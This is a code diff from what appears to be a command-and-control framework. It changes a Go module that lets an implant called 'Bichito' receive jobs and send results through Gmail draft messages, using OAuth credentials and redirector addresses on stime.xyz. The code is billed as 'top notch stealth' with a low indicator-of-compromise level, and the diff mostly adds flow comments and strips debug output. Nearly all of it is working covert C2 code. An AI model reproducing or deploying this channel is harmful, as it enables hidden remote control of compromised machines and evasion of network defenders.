@@ -5,7 +5,7 @@
 //
 //   Warnings:       The top notch stealth                   
 //                   
-//   Fingenprint:    GO-LANG TLS Libraries (target OS network stack?)
+//   Fingenprint:    GO-LANG Client TLS Fingerprint
 //
 //   IOC Level:      Low
 //   
@@ -29,6 +29,10 @@ import (
     "google.golang.org/api/gmail/v1"
 )
 
+/*
+JSON Structures for Compiling Redirectors Network Module parameters
+Hive will have the same definitions in: ./src/hive/hiveImplants.go
+*/
 type Gmail struct {
     Name string   `json:"name"`    
     Creds string   `json:"creds"`
@@ -56,22 +60,33 @@ type BiAuth struct {
     Token string  `json:"token"`  
 }
 
-//With this modules Redirectors will be already an []*Gmail
+/*
+Description: gmailgo,Prepare Redirector Slice
+Flow:
+A.JSON Decode redirector data, for gmail modules, connected app refresh token/creds are needed (redirectors are basically gmail accounts)
+B.Loop over each redirector and craft a working gmail account to connect to
+*/
 func PrepareNetworkMocule(jsonstring string) []string{
 
     var reds *Reds
     errD := json.Unmarshal([]byte(jsonstring),&reds)
 
     if errD != nil{
-        //Debug:
-        //fmt.Println("Parameters JSON Decoding error:"+errD.Error())
         os.Exit(1)
     }
 
 	return reds.Redirectors
 }
 
-//Use Https to retrieve from redirector Jobs for this Bot
+/*
+Description: gmailgo, Retrieve Jobs from gmail draft mails that come from Hive
+Flow:
+A.Provided redirector (gmail creds) and auth JSON, retrieve BID
+B.Retrieve gmail credentials from JSON, create a oauth google client and request access token
+C.With the access token, list the draft and check if a mail draft thread exist with actual BID, if no create it
+D.If a draft with BID subject exists, check if has redirector data "to:bichito@stime.xyz" and subject this BID
+E.If exists, retireve body ,decode it and return (these are the jobs that come from hive to be processed)
+*/
 func RetrieveJobs(redirector string,authentication string) ([]byte,string){
 
     var result []byte
@@ -126,16 +141,11 @@ func RetrieveJobs(redirector string,authentication string) ([]byte,string){
     for _,l := range r.Drafts{
         r2, err2 := srv.Users.Messages.Get(user,l.Message.Id).Do()
             if err2 != nil {
-                //Debug:
-                //fmt.Println(l.Message.Id)
                 existBid = true
                 continue
-                //return result,"Get target Id Message: " +err2.Error()
             }
 
-        //Debug:
-        //fmt.Println("Bid:"+r2.Payload.Headers[2].Value)
-        //fmt.Println(r2.Payload.Headers[2].Value == bid)
+
         if (r2.Payload.Headers[2].Value == bid) {existBid = true}
         if (r2.Payload.Headers[1].Value == "bichito@stime.xyz") && (r2.Payload.Headers[2].Value == bid){
 
@@ -144,8 +154,7 @@ func RetrieveJobs(redirector string,authentication string) ([]byte,string){
             if err != nil {
                 return result,err.Error()
             }
-            //Debug:
-            //fmt.Println("Bid:"+r2.Payload.Headers[2].Value+"TO:"+r2.Payload.Headers[1].Value+"Body:"+string(result))
+
             return result,"Success"
                
         }
@@ -170,7 +179,14 @@ func RetrieveJobs(redirector string,authentication string) ([]byte,string){
     return result,"No redirector answer in respTime"
 }
 
-//Use Https to send a Job to the redirector
+/*
+Description: gmailgo,Send Jobs through gmail draft mails to Hive
+Flow:
+A.Provided redirector (gmail creds) and auth JSON, retrieve BID
+B.Retrieve gmail credentials from JSON, create a oauth google client and request access token
+C.With the access token, list the draft and check if a mail draft thread exist with actual BID, if no create it
+D.Select the draft which subject has BID and write the Job payload in the body
+*/
 func SendJobs(redirector string,authentication string,encodedJob []byte) string{
 
     //Get Bid
@@ -244,7 +260,13 @@ func SendJobs(redirector string,authentication string,encodedJob []byte) string{
 	return "No active Bid"
 }
 
-
+/*
+Description: gmailgo,Checking Bichito
+Flow:
+A.Provided redirector (gmail creds) and auth JSON, retrieve BID
+B.Retrieve gmail credentials from JSON, create a oauth google client and request access token
+C.Create the mail draft thread with BID so can be use in the egression. Redirector will see this mail and check Bichito within Hive
+*/
 func Checking(redirector string,authentication string,bidP string,encodedJob []byte) string{
 
 	//Decode Module Parameters, create listener socket
@@ -270,8 +292,6 @@ func Checking(redirector string,authentication string,bidP string,encodedJob []b
         return "Unable to retrieve Gmail client:"+ err.Error()
     }
 
-    //Debug:
-    //fmt.Println("To Create Bichito:"+bidP)
     
     rawDraft := "To: redirector@stime.xyz\r\nSubject:"+bidP+"\r\n\r\n"+string(encodedJob)
     rawDraftFormatted := base64.RawURLEncoding.EncodeToString([]byte(rawDraft))
